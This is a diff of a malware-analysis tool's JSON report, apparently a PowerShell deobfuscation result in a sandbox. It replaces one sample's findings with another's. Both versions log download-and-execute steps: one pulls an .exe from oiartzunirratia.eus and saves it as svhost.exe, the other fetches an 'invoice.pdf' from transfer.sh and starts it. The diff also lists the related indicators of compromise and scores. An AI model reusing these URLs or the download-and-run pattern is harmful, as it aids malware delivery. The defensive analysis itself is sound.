@@ -1,11 +1,11 @@
 {
   "extra": {
     "drop_file": false,
-    "score": 32,
+    "score": 22,
     "sections": [
       {
         "auto_collapse": false,
-        "body": "[System.Net.WebClient.DownloadFile] Download From: https://oiartzunirratia.eus/install/clean/Lcovlccdxd.exe --> Save To: ./APPDATA/svhost.exe\n\n[Start-Process] ./APPDATA/svhost.exe\n",
+        "body": "[System.Net.WebClient.DownloadFile] Download From: http://deal.real --> Save To: ./C:/Users/Public/apple.png\n\n[System.Net.WebClient.DownloadFile] Download From: https://transfer.sh/get/vpiHmi/invoice.pdf --> Save To: C:ProgramDatainvoice.pdf\n\n[Start-Process] C:ProgramDatainvoice.pdf\n",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 0,
@@ -13,16 +13,22 @@
         "tags": {
           "file": {
             "path": [
-              "./APPDATA/svhost.exe"
-            ]
+              "./C:/Users/Public/apple.png",
+              "C:ProgramDatainvoice.pdf"
+            ],
+            "string": {
+              "extracted": [
+                "http://deal.real"
+              ]
+            }
           },
           "network": {
             "dynamic": {
               "domain": [
-                "oiartzunirratia.eus"
+                "transfer.sh"
               ],
               "uri": [
-                "https://oiartzunirratia.eus/install/clean/Lcovlccdxd.exe"
+                "https://transfer.sh/get/vpiHmi/invoice.pdf"
               ]
             }
           }
@@ -32,7 +38,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"oiartzunirratia.eus\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://oiartzunirratia.eus/install/clean/lcovlccdxd.exe\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/install/clean/lcovlccdxd.exe\"}]",
+        "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"transfer.sh\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://transfer.sh/get/vpihmi/invoice.pdf\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/get/vpihmi/invoice.pdf\"}]",
         "body_format": "TABLE",
         "classification": "TLP:W",
         "depth": 1,
@@ -48,13 +54,13 @@
           "network": {
             "dynamic": {
               "domain": [
-                "oiartzunirratia.eus"
+                "transfer.sh"
               ],
               "uri": [
-                "https://oiartzunirratia.eus/install/clean/lcovlccdxd.exe"
+                "https://transfer.sh/get/vpihmi/invoice.pdf"
               ],
               "uri_path": [
-                "/install/clean/lcovlccdxd.exe"
+                "/get/vpihmi/invoice.pdf"
               ]
             }
           }
@@ -70,7 +76,7 @@
         "depth": 0,
         "heuristic": null,
         "tags": {},
-        "title_text": "Suspicious Content Detected in 8dcad766215c455f6c70f5e78ebb1776e5e436775cbb7f66f1d5d4ccd217e03a",
+        "title_text": "Suspicious Content Detected in 958ed6efd9131c1207df57aeae8b5e0635d135e53d51bbf3d2c3ea1e770d6a97",
         "zeroize_on_tag_safe": false
       },
       {
@@ -119,29 +125,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "Marks: WindowStyle, Hidden, -W, Hidden",
-        "body_format": "TEXT",
-        "classification": "TLP:W",
-        "depth": 1,
-        "heuristic": {
-          "attack_ids": [],
-          "frequency": 1,
-          "heur_id": 3,
-          "score": 10,
-          "score_map": {
-            "Hidden Window": 10
-          },
-          "signatures": {
-            "Hidden Window": 1
-          }
-        },
-        "tags": {},
-        "title_text": "Signature: Hidden Window",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"oiartzunirratia.eus\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://oiartzunirratia.eus/install/clean/lcovlccdxd.exe\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/install/clean/lcovlccdxd.exe\"}]",
+        "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"transfer.sh\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://transfer.sh/get/vpihmi/invoice.pdf\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/get/vpihmi/invoice.pdf\"}]",
         "body_format": "TABLE",
         "classification": "TLP:W",
         "depth": 0,
@@ -157,18 +141,18 @@
           "network": {
             "static": {
               "domain": [
-                "oiartzunirratia.eus"
+                "transfer.sh"
               ],
               "uri": [
-                "https://oiartzunirratia.eus/install/clean/lcovlccdxd.exe"
+                "https://transfer.sh/get/vpihmi/invoice.pdf"
               ],
               "uri_path": [
-                "/install/clean/lcovlccdxd.exe"
+                "/get/vpihmi/invoice.pdf"
               ]
             }
           }
         },
-        "title_text": "IOC(s) extracted from 8dcad766215c455f6c70f5e78ebb1776e5e436775cbb7f66f1d5d4ccd217e03a",
+        "title_text": "IOC(s) extracted from 958ed6efd9131c1207df57aeae8b5e0635d135e53d51bbf3d2c3ea1e770d6a97",
         "zeroize_on_tag_safe": false
       }
     ]
@@ -176,12 +160,8 @@
   "files": {
     "extracted": [
       {
-        "name": "deobfuscated.ps1",
-        "sha256": "aacbf34179967745babdc2eba3c8174a8c7851c76a6e6a1fe1261fa6094c5e70"
-      },
-      {
-        "name": "layer_0.ps1",
-        "sha256": "fd8034c1dc3d53bc854982d584fe5577a631b7778759ccf630a7001483c2e58e"
+        "name": "0d9513514e300353ae162f538801a5df0bcb61311411adab1ce48e88b8dfa1b3",
+        "sha256": "0d9513514e300353ae162f538801a5df0bcb61311411adab1ce48e88b8dfa1b3"
       }
     ],
     "supplementary": []
@@ -211,13 +191,6 @@
         "signatures": [
           "Starts Process"
         ]
-      },
-      {
-        "attack_ids": [],
-        "heur_id": 3,
-        "signatures": [
-          "Hidden Window"
-        ]
       }
     ],
     "tags": {
@@ -225,59 +198,71 @@
         {
           "heur_id": null,
           "signatures": [],
-          "value": "./APPDATA/svhost.exe"
+          "value": "./C:/Users/Public/apple.png"
+        },
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "C:ProgramDatainvoice.pdf"
+        }
+      ],
+      "file.string.extracted": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "http://deal.real"
         }
       ],
       "network.dynamic.domain": [
         {
           "heur_id": null,
           "signatures": [],
-          "value": "oiartzunirratia.eus"
+          "value": "transfer.sh"
         },
         {
           "heur_id": 1,
           "signatures": [],
-          "value": "oiartzunirratia.eus"
+          "value": "transfer.sh"
         }
       ],
       "network.dynamic.uri": [
         {
           "heur_id": null,
           "signatures": [],
-          "value": "https://oiartzunirratia.eus/install/clean/Lcovlccdxd.exe"
+          "value": "https://transfer.sh/get/vpiHmi/invoice.pdf"
         },
         {
           "heur_id": 1,
           "signatures": [],
-          "value": "https://oiartzunirratia.eus/install/clean/lcovlccdxd.exe"
+          "value": "https://transfer.sh/get/vpihmi/invoice.pdf"
         }
       ],
       "network.dynamic.uri_path": [
         {
           "heur_id": 1,
           "signatures": [],
-          "value": "/install/clean/lcovlccdxd.exe"
+          "value": "/get/vpihmi/invoice.pdf"
         }
       ],
       "network.static.domain": [
         {
           "heur_id": 1,
           "signatures": [],
-          "value": "oiartzunirratia.eus"
+          "value": "transfer.sh"
         }
       ],
       "network.static.uri": [
         {
           "heur_id": 1,
           "signatures": [],
-          "value": "https://oiartzunirratia.eus/install/clean/lcovlccdxd.exe"
+          "value": "https://transfer.sh/get/vpihmi/invoice.pdf"
         }
       ],
       "network.static.uri_path": [
         {
           "heur_id": 1,
           "signatures": [],
-          "value": "/install/clean/lcovlccdxd.exe"
+          "value": "/get/vpihmi/invoice.pdf"
         }
       ]
     },
